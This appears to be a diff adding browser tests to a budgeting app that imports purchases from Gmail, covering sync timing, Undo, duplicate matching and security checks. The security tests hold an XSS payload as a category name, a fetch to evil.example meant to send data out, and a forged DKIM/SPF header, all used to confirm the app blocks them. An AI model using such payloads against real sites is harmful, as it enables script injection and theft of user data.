@@ -35,6 +35,10 @@ async function fakeGoogle(app, opts) {
     calls.authHeaders.push(route.request().headers()["authorization"] || "");
     if (opts.status) return route.fulfill({ status: opts.status, contentType: "application/json",
       body: JSON.stringify({ error: { code: opts.status, message: "Request had invalid authentication credentials.", errors: [{ reason: "authError" }] } }) });
+    if (/\/users\/me\/profile/.test(url)) {
+      calls.profile = (calls.profile || 0) + 1;
+      return route.fulfill({ contentType: "application/json", body: JSON.stringify({ emailAddress: "me@gmail.com" }) });
+    }
     if (/\/messages\?/.test(url)) {
       calls.list++;
       const ids = opts.ids || Object.keys(MAILS);
@@ -110,7 +114,7 @@ exports.run = async function (t, env) {
     const sheet = norm(await app.page.evaluate(() => document.querySelector("#sheet").innerText));
     t.has("the inbox opens by itself", sheet, "From Gmail");
 
-    await app.page.click('[data-inbox-add="g1"]');
+    await app.page.click('[data-inbox-edit="g1"]');
     await app.page.waitForTimeout(350);
     t.eq("Add opens the usual form, filled in", await app.page.inputValue("#f-amount"), "94");
     await app.page.click("#f-save");
@@ -211,7 +215,7 @@ exports.run = async function (t, env) {
     Object.keys(MAILS).forEach(k => delete MAILS[k]); Object.assign(MAILS, keep);
     const txt = norm(await app.page.evaluate(() => document.querySelector("#sheet").innerText));
     t.has("the bank alert and the receipt are flagged as one purchase", txt, "Possibly the same purchase");
-    t.has("with what to do", txt, "add only one");
+    t.has("with what to do", txt, "keep only one");
     await app.close();
   }
 
@@ -372,6 +376,239 @@ exports.run = async function (t, env) {
     await fakeGoogle(app, { ids: ["g1"] });
     await returnFromGoogle(app, "n".repeat(40));
     t.eq("one choice is not yet a habit: the parser's category stands", (await app.stored()).inbox.find(x => x.id === "g1").cat, "food");
+    await app.close();
+  }
+
+  /* ---- loop 1: the round-1 attacker's findings ---- */
+  const silentReturn = async (app, st, hashTail) => {
+    const url = app.page.url().split("#")[0];
+    await app.page.evaluate(s => localStorage.setItem("weekend-wallet-gmail-oauth", JSON.stringify({ state: s, at: Date.now(), silent: 1 })), st);
+    await app.page.goto("about:blank");
+    await app.page.goto(url + "#" + hashTail + "&state=" + st);
+  };
+  {
+    /* a background check finishing late must not replace the form you are typing in */
+    const app = await boot(browser, autoState({ autoTs: Date.parse(NOW) }), { now: NOW });
+    await app.page.route("https://gmail.googleapis.com/**", async route => {
+      await new Promise(r => setTimeout(r, 1500));
+      const url = route.request().url();
+      if (/\/messages\?/.test(url)) return route.fulfill({ contentType: "application/json", body: JSON.stringify({ messages: [{ id: "g1", threadId: "g1" }] }) });
+      return route.fulfill({ contentType: "application/json", body: JSON.stringify(MAILS.g1) });
+    });
+    await silentReturn(app, "s".repeat(40), "access_token=" + encodeURIComponent(TOKEN) + "&token_type=Bearer&expires_in=3599&scope=" + encodeURIComponent("https://www.googleapis.com/auth/gmail.readonly"));
+    await app.page.waitForTimeout(300);
+    await app.page.click("#open-add"); await app.page.waitForTimeout(250);
+    await app.page.click("#qa-expense"); await app.page.waitForTimeout(250);
+    await app.page.fill("#f-amount", "123");
+    await app.page.waitForTimeout(3500);
+    t.eq("a late background check leaves your half-typed expense alone", await app.page.inputValue("#f-amount").catch(() => "GONE"), "123");
+    t.ok("but what it found is waiting", (await app.stored()).inbox.some(x => x.id === "g1"));
+    await app.close();
+  }
+  {
+    const app = await boot(browser, autoState(), { now: NOW });
+    const calls = await fakeGoogle(app);
+    await app.tab("settings");
+    await app.page.focus("#s-gmail-client");
+    await app.page.evaluate(() => document.dispatchEvent(new Event("visibilitychange")));
+    await app.page.waitForTimeout(2500);
+    t.eq("never leaves for Google from a screen where you may be typing", calls.auth.length, 0);
+    await app.close();
+  }
+  {
+    const app = await boot(browser, autoState({ autoTs: Date.parse(NOW) + 86400000 }), { now: NOW });
+    const calls = await fakeGoogle(app);
+    await app.page.reload(); await app.page.waitForTimeout(2600);
+    t.eq("a try stamped in the future (clock moved) does not block it forever", calls.auth.length, 1);
+    await app.close();
+  }
+  {
+    const app = await boot(browser, autoState({ autoTs: Date.parse(NOW) }), { now: NOW });
+    await fakeGoogle(app);
+    await silentReturn(app, "u".repeat(40), "error=access_denied");
+    await app.page.waitForTimeout(1200);
+    t.no("any silent miss stays quiet (no popup)", await app.page.evaluate(() => document.querySelector("#sheet").classList.contains("show")));
+    let s = await app.stored();
+    t.eq("it is counted, to back off", s.gmail.autoFails, 1);
+    await app.page.reload(); await app.page.waitForTimeout(600);
+    t.has("and remembered after a relaunch, on Home", norm(await app.shellText()), "automatic check didn’t work");
+    await app.close();
+  }
+  {
+    const app = await boot(browser, autoState({ autoTs: Date.parse(NOW) - 7 * 3600000, autoFails: 1 }), { now: NOW });
+    const calls = await fakeGoogle(app);
+    await app.page.reload(); await app.page.waitForTimeout(2600);
+    t.eq("after a miss it waits 12 hours, not 6", calls.auth.length, 0);
+    await app.close();
+  }
+  {
+    const app = await boot(browser, connected({ expenses: [
+      expense({ id: "h1", amount: 140, date: "2026-10-01", cat: "out", note: "Glovo (EUR 13.49)" }),
+      expense({ id: "h2", amount: 60, date: "2026-10-05", cat: "out", note: "GLOVO" }) ] }), { now: NOW });
+    await fakeGoogle(app, { ids: ["g1"] });
+    await returnFromGoogle(app, "v".repeat(40));
+    t.eq("a note with a foreign-amount suffix still teaches the shop", (await app.stored()).inbox.find(x => x.id === "g1").cat, "out");
+    await app.close();
+  }
+  {
+    const app = await boot(browser, connected({ inbox: [{ id: "d1", amount: 30, currency: "MAD", date: "2026-10-12", merchant: "Shop",
+      status: "new", kind: "debit", cat: "ugone", learned: 1, confidence: 0.9 }] }), { now: NOW });
+    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
+    t.has("a category that no longer exists is not offered", norm(await app.page.evaluate(() => document.querySelector("#sheet").innerText)), "no category yet");
+    await app.page.click('[data-inbox-add="d1"]'); await app.page.waitForTimeout(300);
+    await app.page.click("#f-save"); await app.page.waitForTimeout(450);
+    t.ok("and never written", (await app.stored()).expenses.every(e => e.cat !== "ugone"));
+    await app.close();
+  }
+  {
+    /* custom category names are user (or backup-file) text: never markup */
+    const evil = "<img src=x onerror=window.__pwn=1>";
+    const app = await boot(browser, baseState({ salary: 9000, customCats: [{ id: "uevil01", name: evil, color: "#d6336c", emoji: "", hidden: 0 }],
+      expenses: [expense({ id: "x1", amount: 10, date: "2026-10-14", cat: "uevil01", note: "t" })] }), { now: NOW });
+    await app.tab("history");
+    await app.page.click("#open-add"); await app.page.waitForTimeout(250);
+    await app.page.click("#qa-expense"); await app.page.waitForTimeout(400);
+    t.no("a custom category name never runs as code", await app.page.evaluate(() => !!window.__pwn));
+    t.has("it shows as plain text", await app.page.evaluate(() => document.querySelector("#sheet").innerText), "<img src=x");
+    await app.close();
+  }
+
+  /* ---- loop 1 UX: one tap, with Undo; plain-language errors; the address for login_hint ---- */
+  {
+    const app = await boot(browser, connected({ inbox: [
+      { id: "k1", amount: 32, currency: "MAD", date: "2026-10-13", merchant: "Careem", sender: "Careem", status: "new", kind: "debit", cat: "transport", confidence: 0.9 },
+      { id: "k2", amount: 18, currency: "MAD", date: "2026-10-12", merchant: "Careem", sender: "Careem", status: "new", kind: "debit", cat: "transport", confidence: 0.9 } ] }), { now: NOW });
+    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
+    t.has("the button says what it will do", await app.page.getAttribute('[data-inbox-add="k1"]', "aria-label"), "Add Careem MAD 32 as Transport");
+    await app.page.click('[data-inbox-add="k1"]'); await app.page.waitForTimeout(450);
+    let s = await app.stored();
+    t.ok("Add saves in one tap", s.expenses.some(e => e.mailId === "k1" && e.amount === 32 && e.cat === "transport"));
+    t.ok("and stays in the inbox for the next one", await app.page.evaluate(() => !!document.querySelector('[data-inbox-add="k2"]')));
+    t.has("with an Undo", norm(await app.toast()), "Undo");
+    await app.page.click("#toast button"); await app.page.waitForTimeout(450);
+    s = await app.stored();
+    t.ok("Undo takes the expense back out", !s.expenses.some(e => e.mailId === "k1"));
+    t.eq("and puts the email back in the inbox", s.inbox.find(x => x.id === "k1").status, "new");
+    await app.close();
+  }
+  {
+    /* more than you have left: one tap must not skip the funding question */
+    const app = await boot(browser, connected({ restAmount: 20, restFrom: "2026-10-14", restTs: Date.parse("2026-10-14T08:00:00"),
+      inbox: [{ id: "big", amount: 900, currency: "MAD", date: "2026-10-14", merchant: "Jumia", sender: "Jumia", status: "new", kind: "debit", cat: "shop", confidence: 0.9 }] }), { now: NOW });
+    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
+    await app.page.click('[data-inbox-add="big"]'); await app.page.waitForTimeout(450);
+    t.ok("an expense that needs funding opens the form instead", await app.page.evaluate(() => !!document.querySelector("#f-save")));
+    t.eq("nothing saved behind your back", (await app.stored()).expenses.length, 0);
+    await app.close();
+  }
+  {
+    const app = await boot(browser, connected(), { now: NOW });
+    await app.page.route("https://gmail.googleapis.com/**", r => r.fulfill({ status: 403, contentType: "application/json",
+      body: JSON.stringify({ error: { code: 403, message: "Gmail API has not been used in project 123456789 before or it is disabled. Enable it by visiting https://console.developers.google.com/apis/api/gmail.googleapis.com/overview?project=123456789 then retry.", errors: [{ reason: "accessNotConfigured" }] } }) }));
+    await app.page.route("https://accounts.google.com/**", r => r.fulfill({ body: "x" }));
+    await returnFromGoogle(app, "w".repeat(40));
+    const box = await app.page.evaluate(() => document.querySelector("#inbox-error").innerHTML);
+    t.has("the API-off error is said plainly", box, "switched off in your Google Cloud project");
+    t.has("with a link straight to the switch for that project", box, "apis/library/gmail.googleapis.com?project=123456789");
+    await app.close();
+  }
+  {
+    const app = await boot(browser, connected(), { now: NOW });
+    const calls = await fakeGoogle(app, { ids: ["g1"] });
+    await app.page.route("https://gmail.googleapis.com/gmail/v1/users/me/profile", r => r.fulfill({ contentType: "application/json", body: JSON.stringify({ emailAddress: "badr@gmail.com" }) }));
+    await returnFromGoogle(app, "x".repeat(40));
+    await app.page.waitForTimeout(400);
+    t.eq("the address is remembered once", (await app.stored()).gmail.email, "badr@gmail.com");
+    await app.page.reload(); await app.page.waitForTimeout(500);   /* a relaunch: the hour-long sign-in is gone */
+    await app.tab("settings");
+    await app.page.click("#s-gmail-check"); await app.page.waitForTimeout(600);
+    t.eq("and handed back to Google, so it can skip the account chooser", new URL(calls.auth[calls.auth.length - 1] || "https://x/").searchParams.get("login_hint"), "badr@gmail.com");
+    await app.close();
+  }
+
+  /* ---- loop 1 security: what a hostile script could do once loaded ---- */
+  {
+    const app = await boot(browser, connected(), { now: NOW });
+    const r = await app.page.evaluate(async () => {
+      /* the browser's own policy must be what stops it -- not a dead server */
+      let blocked = false;
+      document.addEventListener("securitypolicyviolation", e => { if (/evil\.example/.test(e.blockedURI)) blocked = true; });
+      try { await fetch("https://evil.example/steal?x=1"); } catch (e) {}
+      await new Promise(r => setTimeout(r, 100));
+      const before = window.GmailSync.fetchNew;
+      try { window.GmailSync.fetchNew = function(){}; } catch (e) {}
+      try { window.GmailSync = { fetchNew: function(){} }; } catch (e) {}
+      return { blocked, locked: window.GmailSync.fetchNew === before };
+    });
+    t.ok("the page cannot send data to a server it doesn't use", r.blocked);
+    t.ok("and no script can swap out the Gmail code that handles the token", r.locked);
+    const html = require("fs").readFileSync(require("path").join(require("../harness").APP_DIR, "index.html"), "utf8");
+    t.ok("the OCR script is one exact version", /tesseract\.js@5\.1\.1\/dist\/tesseract\.min\.js/.test(html) && !/tesseract\.js@5\/dist/.test(html));
+    t.ok("and refused unless its bytes match the pinned hash", /s\.integrity = "sha384-[A-Za-z0-9+\/=]{64}"/.test(html) && /s\.crossOrigin = "anonymous"/.test(html));
+    await app.close();
+  }
+
+  /* ---- loop 1 QA: duplicates against what was saved; Skip undo; double taps; memory; senders ---- */
+  {
+    const app = await boot(browser, connected({
+      expenses: [expense({ id: "ed", amount: 96, date: "2026-10-14", cat: "food", note: "Glovo", mailId: "g1" })],
+      inbox: [ { id: "g1", amount: 94, currency: "MAD", date: "2026-10-14", merchant: "Glovo", sender: "Glovo", status: "added", expenseId: "ed", kind: "debit", cat: "food", confidence: 0.9 },
+               { id: "c9", amount: 96, currency: "MAD", date: "2026-10-14", merchant: "Glovo", sender: "CIH Bank", status: "new", kind: "debit", cat: "food", confidence: 0.85 },
+               { id: "c8", amount: 94, currency: "MAD", date: "2026-10-14", merchant: "Glovo", sender: "CIH Bank", status: "new", kind: "debit", cat: "food", confidence: 0.85 } ] }), { now: NOW });
+    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
+    const rows = await app.page.evaluate(() => [...document.querySelectorAll(".inbox-item")].map(r => r.innerText));
+    t.has("an email you added then edited to 96 is matched at 96", rows.find(r => /96/.test(r)) || "", "already added");
+    t.no("and no longer at the 94 the email said", /already added/.test(rows.find(r => /94/.test(r) && !/96/.test(r)) || ""));
+    await app.close();
+  }
+  {
+    const app = await boot(browser, connected({ inbox: [
+      { id: "s1", amount: 12, currency: "MAD", date: "2026-10-13", merchant: "Foyer", sender: "Foyer", status: "new", kind: "debit", cat: "drinks", confidence: 0.9 } ] }), { now: NOW });
+    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
+    await app.page.click('[data-inbox-skip="s1"]'); await app.page.waitForTimeout(350);
+    t.eq("Skip settles it", (await app.stored()).inbox[0].status, "dismissed");
+    await app.page.click("#toast button"); await app.page.waitForTimeout(350);
+    t.eq("and Skip can be undone", (await app.stored()).inbox[0].status, "new");
+    await app.close();
+  }
+  {
+    const app = await boot(browser, connected({ inbox: [
+      { id: "a1", amount: 10, currency: "MAD", date: "2026-10-13", merchant: "Shop A", sender: "A", status: "new", kind: "debit", cat: "food", confidence: 0.9 },
+      { id: "a2", amount: 20, currency: "MAD", date: "2026-10-12", merchant: "Shop B", sender: "B", status: "new", kind: "debit", cat: "drinks", confidence: 0.9 } ] }), { now: NOW });
+    await app.page.click("#h-inbox"); await app.page.waitForTimeout(300);
+    /* a double-tap: the second tap lands where the next row's button now sits */
+    await app.page.click('[data-inbox-add="a1"]');
+    await app.page.evaluate(() => { const b = document.querySelector('[data-inbox-add="a2"]'); if (b) b.click(); });
+    await app.page.waitForTimeout(400);
+    const s = await app.stored();
+    t.eq("the second half of a double-tap does nothing", s.expenses.length, 1);
+    await app.close();
+  }
+  {
+    /* a 2-2 tie is not a habit; "CIH Bank" (a fallback name) is never learned */
+    const app = await boot(browser, connected({ expenses: [
+      expense({ id: "t1", amount: 5, date: "2026-10-01", cat: "out", note: "Glovo" }), expense({ id: "t2", amount: 5, date: "2026-10-02", cat: "out", note: "Glovo" }),
+      expense({ id: "t3", amount: 5, date: "2026-10-03", cat: "drinks", note: "Glovo" }), expense({ id: "t4", amount: 5, date: "2026-10-04", cat: "drinks", note: "Glovo" }) ] }), { now: NOW });
+    await fakeGoogle(app, { ids: ["g1"] });
+    await returnFromGoogle(app, "y".repeat(40));
+    t.eq("a tie leaves the parser's category", (await app.stored()).inbox.find(x => x.id === "g1").cat, "food");
+    await app.close();
+  }
+  {
+    /* Gmail says the "Glovo" sender failed its check: flagged, and no "your usual" */
+    const forged = Object.assign({}, MAILS.g1, { id: "f1", threadId: "f1" });
+    forged.payload = Object.assign({}, forged.payload, { headers: forged.payload.headers.concat([
+      { name: "Authentication-Results", value: "mx.google.com; dkim=fail header.i=@evil.example; spf=fail smtp.mailfrom=evil.example" }]) });
+    MAILS.f1 = forged;
+    const app = await boot(browser, connected({ expenses: [
+      expense({ id: "u1", amount: 5, date: "2026-10-01", cat: "out", note: "Glovo" }), expense({ id: "u2", amount: 5, date: "2026-10-02", cat: "out", note: "Glovo" }) ] }), { now: NOW });
+    await fakeGoogle(app, { ids: ["f1"] });
+    await returnFromGoogle(app, "z".repeat(40));
+    delete MAILS.f1;
+    const it = (await app.stored()).inbox.find(x => x.id === "f1");
+    t.eq("a sender Gmail could not verify is marked so", it && it.verified, 0);
+    t.no("and never gets your usual category", it && it.learned === 1);
+    t.has("you can see it in the inbox", norm(await app.page.evaluate(() => document.querySelector("#sheet").innerText)), "sender not verified by Gmail");
     await app.close();
   }
 };
